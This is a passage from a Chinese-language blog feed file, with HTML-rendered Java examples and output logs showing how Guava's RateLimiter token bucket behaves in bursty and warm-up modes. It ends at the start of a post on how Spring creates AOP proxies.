class="line"></span><br></pre></td></tr></table></figure><h2 id="Bursty-TryAcquire"><a href="#Bursty-TryAcquire" class="headerlink" title="Bursty-TryAcquire"></a><font color= DarkSlateGray1 >Bursty-TryAcquire</font></h2><p>这里设置限制每秒的流量为5，也就是说第一次请求过后，下次请求需要等200ms</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">RateLimiter r =RateLimiter.create(<span class="number">5</span>);</span><br><span class="line">ExecutorService service = Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line">CountDownLatch latch = <span class="keyword">new</span> CountDownLatch(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    service.submit(<span class="keyword">new</span> MyTask(latch, r));</span><br><span class="line">    latch.countDown();</span><br><span class="line">    System.out.println(<span class="string">&quot;countdown:&quot;</span> + latch.getCount());</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;countdown over&quot;</span>);</span><br><span class="line">service.shutdown();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">countdown:<span class="number">9</span></span><br><span class="line">countdown:<span class="number">8</span></span><br><span class="line">countdown:<span class="number">7</span></span><br><span class="line">countdown:<span class="number">6</span></span><br><span class="line">countdown:<span class="number">5</span></span><br><span class="line">countdown:<span class="number">4</span></span><br><span class="line">countdown:<span class="number">3</span></span><br><span class="line">countdown:<span class="number">2</span></span><br><span class="line">countdown:<span class="number">1</span></span><br><span class="line">countdown:<span class="number">0</span></span><br><span class="line">countdown over</span><br><span class="line">time <span class="number">1538487195698</span>ms :<span class="keyword">true</span></span><br><span class="line">time <span class="number">1538487195699</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487195699</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487195699</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487195699</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487195699</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487195699</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487195698</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487195698</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487195699</span>ms :<span class="keyword">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果使得线程等待401ms,那么程序会存储的令牌为2个</p><blockquote><p>注意刚开始存储的时候，不是慢的，这里的存储量是慢慢增长，并且能够立马拿到</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">RateLimiter r =RateLimiter.create(<span class="number">5</span>);</span><br><span class="line">ExecutorService service = Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line">CountDownLatch latch = <span class="keyword">new</span> CountDownLatch(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    service.submit(<span class="keyword">new</span> MyTask(latch, r));</span><br><span class="line">    <span class="keyword">if</span> (i==<span class="number">9</span>)&#123;</span><br><span class="line">        TimeUnit.MILLISECONDS.sleep(<span class="number">401</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;sleep 10 seconds over&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    latch.countDown();</span><br><span class="line">    System.out.println(<span class="string">&quot;countdown:&quot;</span> + latch.getCount());</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;countdown over&quot;</span>);</span><br><span class="line">service.shutdown();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果刚好允许3个运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">countdown:<span class="number">9</span></span><br><span class="line">countdown:<span class="number">8</span></span><br><span class="line">countdown:<span class="number">7</span></span><br><span class="line">countdown:<span class="number">6</span></span><br><span class="line">countdown:<span class="number">5</span></span><br><span class="line">countdown:<span class="number">4</span></span><br><span class="line">countdown:<span class="number">3</span></span><br><span class="line">countdown:<span class="number">2</span></span><br><span class="line">countdown:<span class="number">1</span></span><br><span class="line">sleep <span class="number">10</span> seconds over</span><br><span class="line">countdown:<span class="number">0</span></span><br><span class="line">countdown over</span><br><span class="line">time <span class="number">1538487297981</span>ms :<span class="keyword">true</span></span><br><span class="line">time <span class="number">1538487297981</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487297981</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487297981</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487297981</span>ms :<span class="keyword">true</span></span><br><span class="line">time <span class="number">1538487297981</span>ms :<span class="keyword">true</span></span><br><span class="line">time <span class="number">1538487297981</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487297981</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487297981</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487297981</span>ms :<span class="keyword">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果等待时间超过1秒，允许放行的流量也不会超过6个，存储的令牌+第一个令牌</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RateLimiter r =RateLimiter.create(<span class="number">5</span>);</span><br><span class="line">ExecutorService service = Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line">CountDownLatch latch = <span class="keyword">new</span> CountDownLatch(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    service.submit(<span class="keyword">new</span> MyTask(latch, r));</span><br><span class="line">    <span class="keyword">if</span> (i==<span class="number">9</span>)&#123;</span><br><span class="line">        TimeUnit.MILLISECONDS.sleep(<span class="number">1001</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;sleep 10 seconds over&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    latch.countDown();</span><br><span class="line">    System.out.println(<span class="string">&quot;countdown:&quot;</span> + latch.getCount());</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;countdown over&quot;</span>);</span><br><span class="line">service.shutdown();</span><br></pre></td></tr></table></figure><p>结果为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">countdown:<span class="number">9</span></span><br><span class="line">countdown:<span class="number">8</span></span><br><span class="line">countdown:<span class="number">7</span></span><br><span class="line">countdown:<span class="number">6</span></span><br><span class="line">countdown:<span class="number">5</span></span><br><span class="line">countdown:<span class="number">4</span></span><br><span class="line">countdown:<span class="number">3</span></span><br><span class="line">countdown:<span class="number">2</span></span><br><span class="line">countdown:<span class="number">1</span></span><br><span class="line">sleep <span class="number">10</span> seconds over</span><br><span class="line">countdown:<span class="number">0</span></span><br><span class="line">countdown over</span><br><span class="line">time <span class="number">1538487514780</span>ms :<span class="keyword">true</span></span><br><span class="line">time <span class="number">1538487514780</span>ms :<span class="keyword">true</span></span><br><span class="line">time <span class="number">1538487514780</span>ms :<span class="keyword">true</span></span><br><span class="line">time <span class="number">1538487514780</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487514780</span>ms :<span class="keyword">true</span></span><br><span class="line">time <span class="number">1538487514780</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487514780</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487514780</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487514780</span>ms :<span class="keyword">true</span></span><br><span class="line">time <span class="number">1538487514780</span>ms :<span class="keyword">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="WarmingUp-TryAcquire"><a href="#WarmingUp-TryAcquire" class="headerlink" title="WarmingUp-TryAcquire"></a><font color= DarkSlateGray1 >WarmingUp-TryAcquire</font></h2><p>使用warmingUp的方式由于默认已经存储满了令牌，那么，它在第一次请求执行完之后，必须等待一定的时间才会让下一次请求开始，而这个请求放行的时间则是会超过存储所需要的时间</p><blockquote><p>注意这里的不同，默认是存储满的，也就是刚开始的消费要慢很多</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">RateLimiter r =RateLimiter.create(<span class="number">5</span>,<span class="number">1</span>,TimeUnit.SECONDS);</span><br><span class="line">ExecutorService service = Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line">CountDownLatch latch = <span class="keyword">new</span> CountDownLatch(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    service.submit(<span class="keyword">new</span> MyTask(latch, r));</span><br><span class="line">    latch.countDown();</span><br><span class="line">    System.out.println(<span class="string">&quot;countdown:&quot;</span> + latch.getCount());</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;countdown over&quot;</span>);</span><br><span class="line">service.shutdown();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果如下</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">countdown:<span class="number">9</span></span><br><span class="line">countdown:<span class="number">8</span></span><br><span class="line">countdown:<span class="number">7</span></span><br><span class="line">countdown:<span class="number">6</span></span><br><span class="line">countdown:<span class="number">5</span></span><br><span class="line">countdown:<span class="number">4</span></span><br><span class="line">countdown:<span class="number">3</span></span><br><span class="line">countdown:<span class="number">2</span></span><br><span class="line">countdown:<span class="number">1</span></span><br><span class="line">countdown:<span class="number">0</span></span><br><span class="line">countdown over</span><br><span class="line">time <span class="number">1538487677462</span>ms :<span class="keyword">true</span></span><br><span class="line">time <span class="number">1538487677462</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487677462</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487677462</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487677462</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487677462</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487677462</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487677462</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487677462</span>ms :<span class="keyword">false</span></span><br><span class="line">time <span class="number">1538487677462</span>ms :<span class="keyword">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Acquire运行案例"><a href="#Acquire运行案例" class="headerlink" title="Acquire运行案例"></a><font color= #EE82EE>Acquire运行案例</font></h1><p>所需要的task源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTask</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> CountDownLatch latch;</span><br><span class="line">    <span class="keyword">private</span> RateLimiter limiter;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> start;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyTask</span><span class="params">(CountDownLatch latch, RateLimiter limiter,<span class="keyword">long</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.latch = latch;</span><br><span class="line">        <span class="keyword">this</span>.limiter = limiter;</span><br><span class="line">       <span class="keyword">this</span>.start=start;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//使得线程同时触发            </span></span><br><span class="line">           latch.await();</span><br><span class="line">            System.out.printf(<span class="string">&quot;result:&quot;</span>+limiter.acquire(<span class="number">2</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot; time &quot;</span>+(System.currentTimeMillis()-start)+<span class="string">&quot;ms&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Busty-Acquire"><a href="#Busty-Acquire" class="headerlink" title="Busty-Acquire"></a><font color= DarkSlateGray1 >Busty-Acquire</font></h2><p>Acquire会阻塞运行的结果，而且会提前消费</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">RateLimiter r =RateLimiter.create(<span class="number">1</span>); </span><br><span class="line">r.acquire();</span><br><span class="line">System.out.println(<span class="string">&quot;time cost:&quot;</span>+(System.currentTimeMillis()-start)+<span class="string">&quot;ms&quot;</span>);</span><br><span class="line">r.acquire();</span><br><span class="line">System.out.println(<span class="string">&quot;time cost:&quot;</span>+(System.currentTimeMillis()-start)+<span class="string">&quot;ms&quot;</span>);</span><br><span class="line">r.acquire(<span class="number">3</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;time cost:&quot;</span>+(System.currentTimeMillis()-start)+<span class="string">&quot;ms&quot;</span>);</span><br><span class="line">r.acquire();</span><br><span class="line">System.out.println(<span class="string">&quot;time cost:&quot;</span>+(System.currentTimeMillis()-start)+<span class="string">&quot;ms&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一次会立马运行，然后因为请求了一次，下次发放令牌的时间往后迁移,获取的令牌越多，下次能够运行需要等待的时间越长</p><p>运行结果为</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">time cost:<span class="number">0</span>ms</span><br><span class="line">time cost:<span class="number">1005</span>ms</span><br><span class="line">time cost:<span class="number">2004</span>ms</span><br><span class="line">time cost:<span class="number">5001</span>ms</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在多线程背景运行如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RateLimiter r =RateLimiter.create(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">long</span> start=System.currentTimeMillis();</span><br><span class="line">r.acquire(<span class="number">3</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;time cost:&quot;</span>+(System.currentTimeMillis()-start)+<span class="string">&quot;ms&quot;</span>);</span><br><span class="line">ExecutorService service = Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line">CountDownLatch latch = <span class="keyword">new</span> CountDownLatch(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    service.submit(<span class="keyword">new</span> MyTask(latch, r,start));</span><br><span class="line">    latch.countDown();</span><br><span class="line">    System.out.println(<span class="string">&quot;countdown:&quot;</span> + latch.getCount());</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;countdown over&quot;</span>);</span><br><span class="line">service.shutdown();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">time cost:1ms</span><br><span class="line">countdown:9</span><br><span class="line">countdown:8</span><br><span class="line">countdown:7</span><br><span class="line">countdown:6</span><br><span class="line">countdown:5</span><br><span class="line">countdown:4</span><br><span class="line">countdown:3</span><br><span class="line">countdown:2</span><br><span class="line">countdown:1</span><br><span class="line">countdown:0</span><br><span class="line">countdown over</span><br><span class="line">result:2.995732 time 3024ms</span><br><span class="line">result:4.995725 time 5006ms</span><br><span class="line">result:6.995719 time 7007ms</span><br><span class="line">result:8.995716 time 9006ms</span><br><span class="line">result:10.995698 time 11004ms</span><br><span class="line">result:12.995572 time 13006ms</span><br><span class="line">result:14.995555 time 15007ms</span><br><span class="line">result:16.995543 time 17005ms</span><br><span class="line">result:18.995516 time 19005ms</span><br><span class="line">result:20.995463 time 21005ms</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="WarmingUp-acquire"><a href="#WarmingUp-acquire" class="headerlink" title="WarmingUp-acquire"></a><font color= DarkSlateGray1 >WarmingUp-acquire</font></h2><p>warmingUp通过acquire的方式获取的令牌，同样会被按照同步的方式获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RateLimiter r =RateLimiter.create(<span class="number">1</span>,<span class="number">1</span>,TimeUnit.SECONDS);</span><br><span class="line"><span class="keyword">long</span> start=System.currentTimeMillis();</span><br><span class="line">r.acquire(<span class="number">3</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;time cost:&quot;</span>+(System.currentTimeMillis()-start)+<span class="string">&quot;ms”);</span></span><br><span class="line"><span class="string">ExecutorService service = Executors.newFixedThreadPool(10);</span></span><br><span class="line"><span class="string">CountDownLatch latch = new CountDownLatch(10);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for (int i=0;i&lt;10;i++)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    service.submit(new MyTask(latch, r,start));</span></span><br><span class="line"><span class="string">    latch.countDown();</span></span><br><span class="line"><span class="string">    System.out.println(&quot;</span>countdown:<span class="string">&quot; + latch.getCount());</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">System.out.println(&quot;</span>countdown over<span class="string">&quot;);</span></span><br><span class="line"><span class="string">service.shutdown();</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">time cost:<span class="number">0</span>ms</span><br><span class="line">countdown:<span class="number">9</span></span><br><span class="line">countdown:<span class="number">8</span></span><br><span class="line">countdown:<span class="number">7</span></span><br><span class="line">countdown:<span class="number">6</span></span><br><span class="line">countdown:<span class="number">5</span></span><br><span class="line">countdown:<span class="number">4</span></span><br><span class="line">countdown:<span class="number">3</span></span><br><span class="line">countdown:<span class="number">2</span></span><br><span class="line">countdown:<span class="number">1</span></span><br><span class="line">countdown:<span class="number">0</span></span><br><span class="line">countdown over</span><br><span class="line">result:<span class="number">3.496859</span> time <span class="number">3521</span>ms</span><br><span class="line">result:<span class="number">5.496854</span> time <span class="number">5506</span>ms</span><br><span class="line">result:<span class="number">7.49685</span> time <span class="number">7505</span>ms</span><br><span class="line">result:<span class="number">9.496835</span> time <span class="number">9504</span>ms</span><br><span class="line">result:<span class="number">11.496821</span> time <span class="number">11505</span>ms</span><br><span class="line">result:<span class="number">13.496807</span> time <span class="number">13502</span>ms</span><br><span class="line">result:<span class="number">15.496793</span> time <span class="number">15504</span>ms</span><br><span class="line">result:<span class="number">17.496778</span> time <span class="number">17506</span>ms</span><br><span class="line">result:<span class="number">19.496707</span> time <span class="number">19506</span>ms</span><br><span class="line">result:<span class="number">21.496699</span> time <span class="number">21506</span>ms</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>RateLimiter本身实现的就是一个<a href="https://en.wikipedia.org/wiki/Token_bucket">令牌桶算法</a></p></blockquote><p>来自： <a href="https://juejin.im/post/5bb48d7b5188255c865e31bc">https://juejin.im/post/5bb48d7b5188255c865e31bc</a> </p>]]></content>
      
      
      <categories>
          
          <category> RateLimiter限流 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Guava </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring是如何启用aop切面</title>
      <link href="/Spring%E6%98%AF%E5%A6%82%E4%BD%95%E5%90%AF%E7%94%A8aop%E5%88%87%E9%9D%A2/"/>
      <url>/Spring%E6%98%AF%E5%A6%82%E4%BD%95%E5%90%AF%E7%94%A8aop%E5%88%87%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<p>Spring是如何启用aop切面（比如声明式事务），而对我们的bean实现代理的呢？</p><a id="more"></a><h1 id="Spring是如何启用aop切面（比如声明式事务），而对我们的bean实现代理的呢？"><a href="#Spring是如何启用aop切面（比如声明式事务），而对我们的bean实现代理的呢？" class="headerlink" title="Spring是如何启用aop切面（比如声明式事务），而对我们的bean实现代理的呢？"></a>Spring是如何启用aop切面（比如声明式事务），而对我们的bean实现代理的呢？</h1><p>首先从后面说实现原理，通过aop包下的AspectJAwareAdvisorAutoProxyCreator 继承自AbstractAdvisorAutoProxyCreator 又继承 <strong><em>AbstractAutoProxyCreator\</em></strong>类，而*<strong>AbstractAutoProxyCreator*</strong>中有个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Create an AOP proxy for the given bean.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> beanClass the class of the bean</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> beanName the name of the bean</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> specificInterceptors the set of interceptors that is</span></span><br><span class="line"><span class="comment">* specific to this bean (may be empty, but not null)</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> targetSource the TargetSource for the proxy,</span></span><br><span class="line"><span class="comment">* already pre-configured to access the bean</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the AOP proxy for the bean</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> #buildAdvisors</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">createProxy</span><span class="params">(Class&lt;?&gt; beanClass, <span class="meta">@Nullable</span> String beanName,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="meta">@Nullable</span> Object[] specificInterceptors, TargetSource targetSource)</span></span></span><br></pre></td></tr></table></figure><p>创建一个类的代理，其中创建ProxyFactory类的对象，调用其getProxy(ClassLoader classLoader)方法，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Create a new proxy according to the settings in this factory.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;Can be called repeatedly. Effect will vary if we&#x27;ve added</span></span><br><span class="line"><span class="comment">* or removed interfaces. Can add and remove interceptors.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;Uses the given class loader (if necessary for proxy creation).</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> classLoader the class loader to create the proxy with</span></span><br><span class="line"><span class="comment">* (or &#123;<span class="doctag">@code</span> null&#125; for the low-level proxy facility&#x27;s 